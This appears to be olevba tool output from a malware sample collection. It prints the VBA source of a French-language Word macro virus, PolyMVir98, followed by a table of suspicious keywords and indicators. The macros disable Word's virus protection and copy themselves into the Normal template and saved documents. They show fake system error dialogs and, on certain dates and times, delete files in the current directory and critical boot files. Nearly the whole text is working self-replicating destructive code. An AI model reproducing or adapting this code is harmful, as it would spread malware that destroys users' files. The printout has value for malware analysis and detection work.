olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Polymvir
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Polymvir - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PolyMVir98.bas 
in file: ./Virus.MSWord.Polymvir - OLE stream: 'Macros/VBA/PolyMVir98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub cexEotuA()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
T$ = Mid(MyTime, 4, 5)
If D$ = "10" Then
    Selection.EndKey Unit:=wdStory
    For i = 1 To 10
    Selection.TypeParagraph
    Selection.TypeText Text:="ZeMacroKiller98 vous dit à bientôt!!!!!"
    Next i
End If
If D$ = "15" Then
Message:
    StatusBar = "La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
GoTo Message
End If
If D$ = "20" And T$ = "20" Then
    MsgBox "Les fichiers du répertoire courant seront effacés!!!", vbCritical, "Virus PolyMVir98"
    Kill CurDir
End If
If D$ = "30" And T$ = "30" Then
    MsgBox "attention, le démarrage risque d'être difficile...", vbCritical, "Virus PolyMVir98"
    Kill "C:\Config.sys"
    Kill "C:\AutoExec.bat"
    Kill "C:\Command.com"
    Kill "C:\Msdos.sys"
    Kill "C:\Io.sys"
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "PMorphVir98" Then
        PMorphVir98Installed = -1
    End If
Next i
If Not PMorphVir98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PolyMVir98", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.VBProject.VBComponents("PolyMVir98").Name = "PMorphVir98"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 1
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 1, "Sub AutoExec"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 72
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 72, "Sub AutoClose"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 102
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 102, "Sub FileSaveAs"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 129
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 129, "Sub FileTemplates"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 138
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 138, "Sub ToolsMacro"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 153
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 153, "Sub ViewVBCode"
End If
ErrorAO:
End Sub
Sub sAevaSeliF()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PolyMVir98", Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents("PMorphVir98").Name = "PolyMVir98"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 1
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 1, "Sub cexEotuA"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 72
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 72, "Sub AutoOpen"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 102
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 102, "Sub sAevaSeliF"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 129
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 129, "Sub setalpmeTelif"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 138
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 138, "Sub orcaMslooT"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 153
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 153, "Sub edoCBVweiV"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub setalpmeTelif()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Erreur Système", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub orcaMslooT()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
Assistant.Visible = True
    With Assistant.NewBalloon
        .Button = msoButtonSetOK
        .Heading = "Virus PolyMVir98"
        .Text = "Je suis un nouveau virus de macro polymorphe!!!"
        .Show
    End With
ErrorTM:
End Sub
Sub edoCBVweiV()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Wword"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AutoExec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

